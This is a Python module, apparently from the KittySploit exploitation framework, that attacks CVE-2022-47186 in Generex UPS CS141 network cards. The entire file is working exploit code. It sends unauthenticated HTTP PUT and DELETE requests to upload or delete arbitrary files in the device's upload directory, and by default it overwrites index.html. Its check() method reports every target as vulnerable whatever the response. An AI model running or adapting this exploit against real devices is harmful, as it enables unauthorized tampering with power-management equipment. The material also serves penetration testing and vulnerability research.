from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.cs141 import CS141


class Module(Auxiliary, Http_client, CS141):
    __info__ = {
        "name": "Generex CS141 CVE-2022-47186 - Unrestricted File Upload/Delete",
        "description": (
            "Generex UPS CS141 below 2.06 allows unauthenticated upload and deletion of arbitrary "
            "files inside the upload directory."
        ),
        "author": ["JoelGMSec", "KittySploit Team"],
        "cve": "CVE-2022-47186",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-47186",
            "https://www.incibe-cert.es/en/early-warning/ics-advisories/update-03032023-multiple-vulnerabilities-generex-ups-cs141",
        ],
        "tags": ["cs141", "upload", "delete", "unauthenticated"],
    }

    action = OptChoice("upload", "Action to perform", required=True, choices=["upload", "delete"])
    remote_name = OptString("index.html", "Filename inside the upload directory", required=True)
    file_content = OptString("KittySploit", "Content to upload when action=upload", required=False)
    content_type = OptString("text/html", "Content-Type for uploaded file", required=False)

    def check(self):
        return {
            "vulnerable": True,
            "reason": "CVE-2022-47186 is action-based; use run() to verify upload/delete behavior.",
            "confidence": "low",
        }

    def run(self):
        upload_path = self.cs141_join_path(self.cs141_normalize_base_path(self.path), "upload", self.remote_name)

        if self.action == "upload":
            response = self.http_request(
                method="PUT",
                path=upload_path,
                headers=self.cs141_unauth_upload_headers(self.content_type),
                data=self.file_content,
                timeout=20,
            )
            if response and response.status_code in (201, 204):
                print_success(f"File uploaded to {upload_path} (HTTP {response.status_code})")
                return True
            print_error(f"Upload failed with HTTP {getattr(response, 'status_code', 'no-response')}")
            return False

        response = self.http_request(
            method="DELETE",
            path=upload_path,
            headers=self.cs141_unauth_upload_headers(self.content_type),
            timeout=20,
        )
        if response and response.status_code in (204, 404):
            print_success(f"Delete request completed for {upload_path} (HTTP {response.status_code})")
            return True
        print_error(f"Delete failed with HTTP {getattr(response, 'status_code', 'no-response')}")
        return False
